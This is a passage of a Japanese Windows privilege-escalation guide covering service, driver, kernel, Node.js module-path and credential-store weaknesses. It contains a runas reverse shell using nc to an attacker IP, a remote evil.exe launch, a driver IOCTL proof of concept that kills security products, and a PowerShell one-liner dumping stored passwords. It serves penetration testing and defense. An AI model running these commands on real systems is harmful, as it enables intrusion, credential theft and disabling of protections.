オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールされたタスクまたはサービスがあると、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながる可能性があります。特権ユーザーが実際に読み込むことと、サイドカーファイル**両方**を作成または変更できることを確認してください。ヘルパーを見つけただけでは不十分です。

スケジュールされたタスクについては、そのアクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手がかりにすぎず、タスクがそこで入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM と決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして privilege escalation できる可能性があります）と、**フォルダー**の権限（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361) は、`C:\Windows\Temp` にコマンドファイルを書き込み、置き換えに失敗した場合に既存の書き込み保護されたファイルを実行していた、古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている完全なパッチレベルと、影響を受ける agent 操作を実行できるかどうかを確認してください。`2.1` のようなブランチのみのラベルでは、脆弱性の有無を判断できません。ファイルの作成や agent コマンドの実行を行わずに、バージョン、サービスの状態、Temp の権限を調べて列挙できます。

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は build 6210 以前の ADSelfService Plus に影響し、ベンダーは build 6211 で修正しました。SAML SSO が**現在または過去に有効だった場合にのみ**関係します。したがって、インストール済み製品のエントリやサービスパスは手がかりにすぎず、脆弱性を示すものではありません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、および実行アカウントを確認してください。サービス経由のコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM での実行には、SYSTEM として実行されているインスタンスが必要です。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップの手がかりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権を記録してください。

#### Jenkins controller and domain-account boundaries

Windows Jenkins controller では、job の作成または構成の権限と、job の開始権限を区別してください。[Jenkins ではこれらを別々の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。構成済みのスケジュールやリモートトリガーが別の build 経路になる場合もありますが、有効になっていて、実際に build が実行されることを確認してください。実行時の ID は controller または選択された agent のものとなり、保存済みの credential は job がそのスコープにアクセスできる場合にのみ使用できます。別途、`JENKINS_HOME` のメタデータへのアクセスを調べてください。Jenkins は `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に credential の素材と暗号化キーを保存します（[Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけでは、パスワードが判明するわけではありません。共有出力に秘密情報を表示せず、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認してください。そのアカウントに AD user-object の `scriptPath` 書き込み権限がある場合は、対象ユーザーとして実行される実際のログオンまたはスケジュール済みのコンシューマーと、書き込み可能なスクリプトパスの両方を確認してから、ユーザーをまたぐ実行と判断してください。さらにグループを制御できるかどうかは、実効 AD 権限を個別に確認する必要があります。

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server または Azure Pipelines project では、pipeline の**作成または編集**権限と、pipeline を**キューに登録**して選択した agent pool を使う権限を区別してください。[Microsoft は pipeline の権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を別々に説明しています。権限の低いアカウントが script step を送信し、その pipeline を self-hosted Windows agent 上で実行できる場合、step は[agent に設定されたオペレーティングシステムアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザーをまたぐ、または SYSTEM への権限移行を主張する前に、正確な pipeline、branch/resource の制限、認可された pool、実行可能な job、agent のサービス ID を確認してください。agent がインストールされていること、project role、または repository への書き込み権限だけでは手がかりにすぎません。passive enumeration 中に build を開始せず、権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync credentials

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL database にアクセスする **ADSync service account** と、ディレクトリ権限が構成済みの同期機能によって異なる **AD DS connector account** を区別しています。connector の credential はその database に暗号化して保存され、鍵の素材は[ADSync service account の下で DPAPI により保護されています](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者権限を連想させるグループがあること、または database を参照できることだけでは、復号可能な credential やドメイン権限昇格を立証できません。実際の database 読み取り権限、サービスアカウントと鍵へのアクセス、インストールおよび SQL の配置、構成済みの connector identity、その identity の実効 AD 権限を個別に確認してください。通常の列挙では、サービスとアクセスのメタデータのみを表示し、保存された秘密情報をクエリしたり表示したりしないでください。

#### Printer driver support DLL permissions

インストール済みの printer driver は `C:\ProgramData` に support DLL を置き、より高い権限で動作する print process 内で読み込む場合があります。printer WMI enumeration が拒否される場合でも、親ディレクトリや reparse point を含め、正確な driver ディレクトリと DLL の ACL を確認してください。[Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` でした。[元の開示](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みについて説明されています。書き込み可能な ACL は手がかりにすぎません。deny エントリ適用後の実効書き込み権限、該当する driver がインストールされていて特権 ID でそのファイルを読み込むこと、ベンダーの更新済み driver またはセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名や driver のバージョンだけから脆弱性を推測しないでください。

### 書き込み権限

特別なファイルを読み取るために設定ファイルを変更できるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認してください。

システム内の権限が弱いフォルダーやファイルを見つける方法は次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoloadによる永続化/実行

Notepad++は`plugins`サブフォルダー内のプラグインDLLを自動ロードします。書き込み可能なportable/copy版のインストールがある場合、悪意のあるプラグインを配置すると、起動するたびに`notepad++.exe`内でコードが自動実行されます（`DllMain`やプラグインのコールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリ項目やバイナリを上書きできるか確認してください。**\
**権限昇格に利用できる興味深い** **autorunsの場所については、次のページを読んでください**。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の怪しい/脆弱な**ドライバーがないか探してください。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られるもの）を公開している場合、kernel memory から SYSTEM token を直接盗むことで権限昇格できます。<sup>[[13]](#references)</sup> 詳細な手順はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

脆弱な呼び出しが攻撃者の制御下にある Object Manager path を開く race-condition bug では、lookup を意図的に遅らせる（最大長の component や深い directory chain を使う）ことで、競合の時間枠をマイクロ秒から数十マイクロ秒に広げられます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、単体では弱い2つの bug を組み合わせて構築できます。1つは queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは `RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査および exploit に関するメモ：

- **lock 中に解放し、その後 cancel**：成功パスが **Acquire -> CompleteRequest/free -> Release** を実行し、cancel パスが **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探してください。成功パスが CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後で再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- **解放済みの queue object を再利用する**：同じサイズの、攻撃者が制御する paged-pool allocation を使います。`NPFS` Data Queue Entries は payload と size を制御でき、後で pipe read/peek 操作で確認できるため有用です。解放済み object に list link が含まれる場合は、これを **user memory 内の偽装 request node の循環リスト** で上書きし、元の list head で処理が終了せず、ドライバーが攻撃者定義の request structure を繰り返し処理するようにします。
- **予測可能な write を強化する**：偽装 request によって bookkeeping write（timestamp / QPC / refcount に隣接する field）で使われる nested context pointer を付け替えられる場合、**書き込み先アドレスは制御できるが、値は制御できない** kernel write を実現できる可能性があります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、破損した object が **out-of-bounds paged-pool read** を引き起こすまで spray を列挙します。
- **race 可能な disclosure のパターン**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、どれも有力な候補です。攻撃者がコピーされる buffer を大きくできる場合（たとえば、多数の list/resource entry を追加して serializer の最終 allocation size を増やすなど）、マシンをクラッシュさせずに置換可能な時間枠を広げられるため、信頼性が向上します。
- **pointer を多く含む再利用先**：Windows **I/O ring** の registered-buffer array は、paged-pool のサイズを攻撃者が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure の標的です。これらの array の1つを leak し、周辺の `IORING_OBJECT` を特定してから **`RegBuffers`** と **`RegBuffersCount`** を破損させることで、後続の I/O ring 操作に攻撃者が偽造した entry を使用させ、任意の kernel read/write を実現できます。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` 由来の値）しか与えない場合は、**unaligned write を重ねて** `0x0101010101010101` のような同じ byte が繰り返される user pointer を構築し、`VirtualAlloc` で map して、偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

有用な debugging indicator：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive workflow を使って SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive の脆弱性では、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子キーを悪用し、独自の driver を使わずにメタデータ破損を kernel paged-pool overflow に変換できます。攻撃チェーンの全容はこちらで解説しています。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる `RtlQueryRegistryValues` の direct-mode 型混同

一部の driver は userland からレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出し、`RTL_QUERY_REGISTRY_DIRECT` を使って `int readValue` のようなスタック上のスカラー変数に値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリ値の**実際の**型に従って解釈されます。

これにより、次の2つの有用なプリミティブが得られます。<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled な絶対パス `\Registry\...` を使って、driver に攻撃者が選んだキーを照会させることができます。戻り値やログからキーの存在を漏らし、場合によっては呼び出し元が直接アクセスできない値を読み取れます。
- **Kernel memory corruption**: `&readValue` のようなスカラーの宛先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定されたバイナリバッファとして型混同されます。

実践的な悪用に関する注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive**を照会すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能な状態を維持するには、`HKCU` に値をステージングするのではなく、**信頼されたシステム hive 内にある攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive へのステージング**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した**低整合性**token でもスキャンを再実行して、sandbox 環境からアクセスできるキーを探します。<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int`への8バイトの直接書き込みは、隣接するスタックデータを破損させ、近くのcallback/function pointerを部分的に上書きする可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが攻撃者制御の`REG_DWORD`をスタック上のスカラーに読み込み、その同じバッファを文字列読み取りに再利用すると、攻撃者は`Length`/`MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、半制御のkernel writeが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファサイズとして扱います。先行する`REG_DWORD`の読み取りによって、再利用されるスカラーに攻撃者制御の**負の値**が残ると、次の`REG_BINARY`クエリは攻撃者のバイト列を隣接するスタックスロットへ直接コピーします。これは多くの場合、callback pointerを完全に上書きする最も簡単な方法です。

有力な探索パターン: **再初期化せずに、同じスタック変数へ異なる型のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された`EntryContext`ポインター、および最初のレジストリ読み取りによって2回目の読み取りを実行するかどうかが決まるコードパスをgrepしてください。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPENの設定漏れを悪用する（LPE + EDR kill）

一部の署名済みサードパーティードライバーは、IoCreateDeviceSecureで強力なSDDLを指定してデバイスオブジェクトを作成する一方、DeviceCharacteristicsでFILE_DEVICE_SECURE_OPENを設定し忘れています。このフラグがないと、デバイスを追加のコンポーネントを含むパス経由で開いた場合、セキュアDACLが適用されません。そのため、権限のないユーザーでも、次のような名前空間パスを使ってハンドルを取得できます。<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

ユーザーがデバイスを開けるようになると、ドライバーが公開する特権IOCTLを悪用して、LPEや改ざんを行えます。実環境で確認された機能の例:
- 任意のプロセスへのフルアクセスハンドルの返却（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（オフラインでの改ざん、ブート時の永続化手法）。
- Protected Process/Light (PP/PPL)を含む任意のプロセスの終了。これにより、kernel経由でuser landからAV/EDR killが可能になります。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLで制限するデバイスオブジェクトを作成する場合は、必ず FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加してください。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネル権限を直接使う代わりに、ブローカーを介したモデルを検討してください。

防御担当者向けの検知案
- 不審なデバイス名（例：\\ .\\amsdk*）に対するユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視してください。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストを管理してください。


## PATH DLL Hijacking

**PATH 上にあるフォルダー内への書き込み権限**がある場合、プロセスによって読み込まれる DLL をハイジャックし、**権限を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーの権限を確認してください：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron のモジュール解決ハイジャック

これは、`require("foo")` のような bare import を実行した際に、想定されるモジュールが**見つからない**場合に **Node.js** および **Electron** アプリケーションに影響する、**Windows の制御されていない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリにある `node_modules` フォルダを確認してパッケージを解決します。Windows ではこの探索がドライブのルートまで達することがあるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に探す可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダ）を配置し、**高権限の Node/Electron プロセス**が見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行されている場合、昇格されたスケジュールタスク／サービスラッパーから実行されている場合、または特権を持つデスクトップアプリとして自動起動される場合、これは **LPE** につながります。

特に、次のような場合によく発生します。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続ける
- 本番ビルドからパッケージが削除された、パッケージ化時に含め忘れた、またはインストールに失敗した
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの奥深くにある

### 脆弱なターゲットの探索

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` を対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）に設定してフィルタリングする
- `Path` に `node_modules` が `contains` される条件でフィルタリングする
- `NAME NOT FOUND` と、`C:\node_modules` で最後に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションのソースで役立つコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースの確認から、**不足しているパッケージ名**を特定します。
2. 存在しない場合は、ルートの検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 期待される名前と完全に一致する名前のモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者のアプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際に存在する任意モジュールの例として `bluebird` や `utf-8-validate` があります。ただし、再利用可能な部分は**手法**です。特権で動作する Windows Node/Electron プロセスが解決する、任意の**未解決のbare import**を見つけてください。

### 検知とハードニングのアイデア

- ユーザーによる `C:\node_modules` の作成や、新しい `.js` ファイル／パッケージの書き込みを検知します。
- `C:\node_modules\*` から読み込む高い整合性レベルのプロセスを調査します。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査します。
- サードパーティコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認します。
- ライブラリがサポートしている場合は、オプションのプローブを無効にします（たとえば、一部の `ws` デプロイメントでは `WS_NO_UTF_8_VALIDATE=1` を設定して、レガシーな `utf-8-validate` のプローブを回避できます）。

## ネットワーク

### 共有

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hostsファイル

hostsファイルにハードコードされている、ほかの既知のコンピューターを確認します。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開放ポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、起動元のサービスまたはスケジュールされたタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるかどうかは、その認証とコマンド制御の設定によります。より高い権限を持つアカウントで実行されるカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは手掛かりにすぎません。認証が必要なメモリ破損経路を確認するには、そのバイナリ本体と外部から到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、転送先に到達できることや、脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Table

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall Rules

[**Firewall 関連コマンドはこちらのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

ネットワークの列挙に使える[その他のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

rootユーザーを取得すると、任意のポートで listen できます（初めて `nc.exe` でポートを listen するとき、ファイアウォールで `nc` を許可するかどうかをGUIで尋ねられます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bashをrootとして簡単に起動するには、`--default-user root`を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`フォルダーで、`WSL`のファイルシステムを確認できます。

WSL内のLinuxの`root`権限だけでは、WindowsのAdministrator権限は得られません。現在のWindowsユーザーがディストリビューションのファイルシステムを読み取れる場合は、認証情報が記録されている可能性のあるコマンドを探すため、`/root/.bash_history`などのシェル履歴ファイルを確認してください。権限昇格には、引き続き、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs`の構成は古いWSLインストールに適用されます。WSL 2では、一般にディストリビューションは[`ext4.vhdx`仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存場所を特定してください。自動enumeration中に履歴の内容を表示するのは避けてください。

## Windowsの認証情報

### Winlogonの認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値は、レジストリに平文の認証情報があることを示します。`AutoAdminLogon=1` でも平文パスワードを読み取れない場合は、あくまで手がかりにすぎません。[Sysinternals Autologon](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) はパスワードを LSA secret として保存することがあり、通常のレジストリ読み取りでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の漏えいを報告する前に、アクセス権と実際のログオン設定を確認してください。

### 資格情報マネージャー / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>より\
Windows Vault は、**Windows** が**ユーザーを自動的にログインさせる**ために使用できる、サーバー、Webサイト、その他のプログラム用のユーザー認証情報を保存します。一見すると、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーに自動ログインさせられるように思えるかもしれませんが、そうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるために使用できる認証情報を保存します。つまり、**リソース**（サーバーまたはWebサイト）へのアクセスに認証情報が必要な**Windows アプリケーションは、Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を使うことはできないと思います。そのため、アプリケーションで vault を利用するには、何らかの方法で**Credential Manager と通信し、既定のストレージ vault からそのリソース用の認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。次の例では、SMB share 経由でリモート binary を呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報を使った `runas` の使用。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)からも取得できることに注意してください。

### UWP PasswordVault / Credential Locker

最新のWindows UWPアプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や`SeDebugPrivilege`権限がなくても、ネイティブに復号できます。

ユーザーのアクティブなセッション内で次のPowerShellコマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

